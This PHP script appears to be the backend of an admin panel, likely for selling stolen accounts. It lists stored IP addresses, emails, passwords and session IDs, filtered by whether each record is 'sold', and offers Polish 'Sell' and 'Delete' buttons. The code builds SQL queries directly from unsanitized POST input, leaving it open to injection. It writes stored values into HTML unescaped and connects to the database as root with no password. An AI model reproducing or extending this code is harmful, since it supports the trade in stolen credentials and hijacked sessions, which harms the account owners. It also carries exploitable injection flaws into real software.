<?php
//fetch1.php
$connect = mysqli_connect("localhost", "root", "", "testing");
$columns = array('ip', 'email', 'pass','sessionid');

$query = "SELECT * FROM user WHERE `sprzedane` = 'nie'";

if(isset($_POST["search"]["value"]))
{
 $query .= '
 AND email LIKE "%'.$_POST["search"]["value"].'%" ';
}





if(isset($_POST["order"]))
{
 $query .= 'ORDER BY '.$columns[$_POST['order']['0']['column']].' '.$_POST['order']['0']['dir'].' 
 ';
}
else
{
 $query .= 'ORDER BY id DESC ';
}

$query1 = '';

if($_POST["length"] != -1)
{
 $query1 = 'LIMIT ' . $_POST['start'] . ', ' . $_POST['length'];
}

$number_filter_row = mysqli_num_rows(mysqli_query($connect, $query));

$result = mysqli_query($connect, $query . $query1);

$data = array();

while($row = mysqli_fetch_array($result))
{
 $sub_array = array();
 $sub_array[] = '<div contenteditable class="update " data-id="'.$row["id"].'" data-column="ip">' . $row["ip"] . '</div>';
 $sub_array[] = '<div contenteditable class="update" data-id="'.$row["id"].'" data-column="email">' . $row["email"] . '</div>';
 $sub_array[] = '<div contenteditable class="update" data-id="'.$row["id"].'" data-column="pass">' . $row["pass"] . '</div>';
 $sub_array[] = '<div contenteditable class="update" data-id="'.$row["id"].'" data-column="sessionid">' . $row["sessionid"] . '</div>';
 $sub_array[] = '<button type="button" name="sprzedaj" class="btn btn-warning btn-xs sprzedaj" id="'.$row["id"].'">Sprzedaj</button>';
 $sub_array[] = '<button type="button" name="delete" class="btn btn-danger btn-xs delete" id="'.$row["id"].'">Usuń</button>';
    
 $data[] = $sub_array;
}

function get_all_data($connect)
{
 $query = "SELECT * FROM user WHERE `sprzedane` = 'nie' ";
 $result = mysqli_query($connect, $query);
 return mysqli_num_rows($result);
}

$output = array(
 "draw"    => intval($_POST["draw"]),
 "recordsTotal"  =>  get_all_data($connect),
 "recordsFiltered" => $number_filter_row,
 "data"    => $data
);

echo json_encode($output);

?>